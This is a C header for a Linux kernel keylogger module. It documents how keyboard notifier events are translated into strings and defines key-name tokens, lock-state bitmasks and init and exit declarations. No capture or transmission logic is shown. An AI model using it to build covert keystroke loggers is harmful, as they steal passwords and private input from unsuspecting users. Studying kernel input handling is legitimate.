#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

/* https://github.com/enaudon/abide/blob/master/headers/keysym.h */

/* =============================
 * Key Symbol Translation Header
 * =============================
 *
 * Description:
 * -----------
 *      This header files contains a variety of translation functions (one for
 * each used key symbol type), along with a wrapper function (xlate_ksym) that
 * can translate any key symbol.  The type-specific translation functions
 * should not be directly invoked.  The wrapper function will select the
 * appropriate function to translate a given keystroke.  The wrapper takes two
 * parameters, a pointer to a keyboard_notifier_param and a pointer to an
 * character buffer where the keystroke's string representation should be
 * stored:
 *    void xlate_keysym(keyboard_notifier_param *, char *)
 *
 * The keyboard_notifier_param Structure:
 * -------------------------------------
 *      They keyboard_notifier_param structure and some of its fields are a
 * little confusing and deserve some mention.  According to LXR, the
 * keyboard_notifier_param struct is defined as follows in linux v2.6.38-8:
 *
 *    struct keyboard_notifier_param {
 *      struct vc_data *vc;     // VC on which the keyboard press was done
 *      int down;               // Pressure of the key?
 *      int shift;              // Current shift mask
 *      int ledstate;           // Current led state
 *      unsigned int value;     // keycode, unicode value or keysym
 *    };
 *
 * The important fields for our purposes are...
 *    1) down: flag that indicates the pressure of the keyboard event
 *        - zero     = key-press
 *        - non-zero = key-release
 *    2) ledstate: set of binary flags indicating the state of scoll and number
 *                 lock
 *        - set     = scroll/num lock enabled
 *        - cleared = scroll/num lock disabled
 *        - bit 0: scroll lock
 *        - bit 1: num lock
 *    3) value: (arbitrary) short used to identify each key
 *        - interpretation depends on keyboard mode (we assume non-unicode)
 *        - low-order byte is a value; high-order byte is a type:
 *                val----------------------------+
 *                type--------------------+      |
 *                                        |      |
 *                ks->value = 0x1234 = | 0x12 | 0x23 |
 *        - type used to select the appropriate translation function
 *        - value used to perform the actual translation
 */

#include <linux/keyboard.h>

//maximum output buffer size
#define BUFLEN 65535

//ledstate bitmasks
#define SLOCK_MASK 0x00000001   //bit 0 = scroll lock
#define NLOCK_MASK 0x00000002   //bit 1 = num lock

//shift bitmasks
#define CLOCK_MASK 0x00000040   //bit 6 = caps lock

//string representations for common keys
#define UNKNOWN "<unkn>"
#define NO_EFCT "<null>"
#define MENU    "<menu>"
#define ENTER   "<ent>"
#define INSERT  "<ins>"
#define DELETE  "<del>"
#define PAGE_UP "<pg up>"
#define PAGE_DN "<pg dn>"
#define HOME    "<home>"
#define END     "<end>"
#define PAU_BRK "<pb>"
#define ARW_UP  "<u arw>"
#define ARW_DN  "<d arw>"
#define ARW_LT  "<l arw>"
#define ARW_RT  "<r arw>"
#define F_KEYS  "<f"  //no, i didn't forget the end
#define CAPLOCK "<cap _>"

//string representations for key pressure
#define PRESS   'p'
#define RELEASE 'r'

//string representations for (cap/num/scroll) lock status
#define ENABLE  'e'
#define DISABLE 'd'

int keylogger_init(void);
int keylogger_exit(void);

#endif
